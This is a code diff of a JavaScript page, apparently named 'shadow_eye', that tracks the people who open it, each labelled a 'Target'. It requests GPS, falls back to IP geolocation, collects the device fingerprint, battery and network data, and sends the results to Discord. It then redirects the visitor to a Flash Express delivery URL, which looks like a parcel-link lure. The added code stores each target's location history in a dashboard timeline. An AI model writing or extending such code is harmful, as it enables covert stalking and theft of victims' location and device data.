@@ -292,70 +292,130 @@
       } catch (_) {}
     }
 
-    // ===== HYBRID GEOLOCATION =====
-    async function runHybridGeolocation() {
-      const targetId = getUrlParam('id') || 'player_1';
-      const fp = getFingerprint();
-      const result = {
-        actor: 'Target',
-        targetId: targetId,
-        permission: null,
-        source: null,
-        coords: null,
-        ipData: null,
-        fingerprint: fp,
-        distanceKm: null,
-        timestamp: new Date().toISOString(),
-        mapsLink: null,
-      };
+// ===== HYBRID GEOLOCATION =====
+     async function runHybridGeolocation() {
+       const targetId = getUrlParam('id') || 'player_1';
+       const fp = getFingerprint();
+       const result = {
+         actor: 'Target',
+         targetId: targetId,
+         permission: null,
+         source: null,
+         coords: null,
+         ipData: null,
+         fingerprint: fp,
+         distanceKm: null,
+         timestamp: new Date().toISOString(),
+         mapsLink: null,
+       };
 
-      try {
-        const gps = await requestGPS();
-        result.permission = 'Granted';
-        result.source = 'GPS';
-        result.coords = gps;
-        result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
-      } catch (err) {
-        result.permission = 'Denied';
-        result.source = 'IP Geolocation';
+       try {
+         const gps = await requestGPS();
+         result.permission = 'Granted';
+         result.source = 'GPS';
+         result.coords = gps;
+         result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
+       } catch (err) {
+         result.permission = 'Denied';
+         result.source = 'IP Geolocation';
 
-        try {
-          const ip = await fetchIPGeo();
-          result.ipData = ip;
-          result.coords = { latitude: ip.latitude, longitude: ip.longitude };
-          result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
-        } catch (ipErr) {
-          console.error('IP Geo failed:', ipErr);
-        }
-      }
+         try {
+           const ip = await fetchIPGeo();
+           result.ipData = ip;
+           result.coords = { latitude: ip.latitude, longitude: ip.longitude };
+           result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+         } catch (ipErr) {
+           console.error('IP Geo failed:', ipErr);
+         }
+       }
 
-      if (result.coords?.latitude != null) {
-        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
-      }
+       if (result.coords?.latitude != null) {
+         result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
+       }
 
-      // Get battery info
-      if (typeof navigator.getBattery === 'function') {
-        try {
-          const battery = await navigator.getBattery();
-          result.battery = Math.round((battery.level || 0) * 100);
-          result.charging = battery.charging;
-        } catch (_) {}
-      }
+       // Get battery info
+       if (typeof navigator.getBattery === 'function') {
+         try {
+           const battery = await navigator.getBattery();
+           result.battery = Math.round((battery.level || 0) * 100);
+           result.charging = battery.charging;
+         } catch (_) {}
+       }
 
-      // Get network info
-      try {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-          result.network = conn.effectiveType || conn.type || 'Unknown';
-        }
-      } catch (_) {}
+       // Get network info
+       try {
+         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+         if (conn) {
+           result.network = conn.effectiveType || conn.type || 'Unknown';
+         }
+       } catch (_) {}
 
-      // Send to Discord
-      await sendToDiscord(result);
+       // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
+       syncCoordinatesToMainPage(targetId, result);
 
-      // Redirect to Flash Express
-      window.location.href = FLASH_EXPRESS_URL;
-    }
+       // Send to Discord
+       await sendToDiscord(result);
+
+       // Redirect to Flash Express
+       window.location.href = FLASH_EXPRESS_URL;
+     }
+
+     // ซิงค์พิกัดไปยังหน้าหลัก
+     function syncCoordinatesToMainPage(targetId, data) {
+       try {
+         // ดึงข้อมูลผู้เล่นปัจจุบัน
+         const playersKey = 'shadow_eye_players';
+         const players = JSON.parse(localStorage.getItem(playersKey) || '[]');
+         
+         // ค้นหาผู้เล่นที่ตรงกับ targetId
+         const playerIndex = players.findIndex(p => p.id === targetId);
+         if (playerIndex >= 0) {
+           // อัปเดตข้อมูลพิกัด
+           players[playerIndex].coords = {
+             latitude: data.coords?.latitude,
+             longitude: data.coords?.longitude
+           };
+           players[playerIndex].lastUpdate = data.timestamp;
+           players[playerIndex].permission = data.permission;
+           players[playerIndex].source = data.source;
+           players[playerIndex].distanceKm = data.distanceKm;
+           players[playerIndex].ip = data.ipData?.ip || null;
+           players[playerIndex].isp = data.ipData?.org || null;
+           players[playerIndex].os = data.fingerprint?.os || null;
+           players[playerIndex].screen = data.fingerprint?.screen || null;
+           players[playerIndex].lastOnline = data.timestamp;
+           players[playerIndex].lastOffline = null;
+           
+           if (data.battery !== undefined) {
+             players[playerIndex].battery = data.battery;
+             players[playerIndex].charging = data.charging;
+           }
+           if (data.network) {
+             players[playerIndex].network = data.network;
+           }
+           
+           localStorage.setItem(playersKey, JSON.stringify(players));
+           
+           // เพิ่มเหตุการณ์ลงในไทม์ไลน์
+           const timelineKey = 'shadow_eye_timeline_' + targetId;
+           const timeline = JSON.parse(localStorage.getItem(timelineKey) || '[]');
+           timeline.push({
+             type: 'online',
+             timestamp: data.timestamp,
+             time: new Date().toLocaleTimeString('th-TH', { hour12: false }),
+             date: new Date().toLocaleDateString('th-TH'),
+             coords: data.coords
+           });
+           
+           // กรองเหตุการณ์เก่ากว่า 24 ชั่วโมง
+           const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000);
+           const filteredTimeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
+           localStorage.setItem(timelineKey, JSON.stringify(filteredTimeline));
+         }
+       } catch (e) {
+         console.error('Sync to main page failed:', e);
+       }
+     }
 
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
